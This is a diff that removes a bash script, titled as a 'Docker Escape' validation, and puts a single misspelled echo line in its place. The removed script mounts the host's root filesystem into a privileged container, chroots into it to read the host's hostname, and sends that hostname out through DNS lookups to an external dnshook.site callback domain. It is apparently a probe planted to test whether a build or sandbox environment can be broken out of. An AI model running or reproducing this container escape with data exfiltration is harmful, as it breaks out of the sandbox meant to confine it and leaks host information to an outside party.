@@ -1,18 +1,1 @@
-#!/bin/bash
-# Nifty 50 Host-Level Validation (Docker Escape)
-
-# 1. Attempt to run a container that mounts the HOST's root directory
-# We use 'alpine' because it is small and fast. 
-# We mount / (host) to /mnt/host (container).
-if sudo docker run --rm -v /:/mnt/host alpine chroot /mnt/host /bin/sh -c "hostname" > /tmp/host_identity 2>/dev/null; then
-    
-    # 2. If successful, capture the HOST's hostname
-    HOST_NAME=$(cat /tmp/host_identity | tr -d ' ' | cut -c 1-30)
-    
-    # 3. Signal the successful escape via DNSHook
-    # This proves you are reading data from OUTSIDE the container
-    dig "ESCAPE-SUCCESS-${HOST_NAME}.20f19d8b-fec1-479f-801f-3722f430de21.dnshook.site" +short
-else
-    # Signal failure if the docker socket is restricted
-    dig "ESCAPE-FAILED.20f19d8b-fec1-479f-801f-3722f430de21.dnshook.site" +short
-fi
+echo("Sucess")
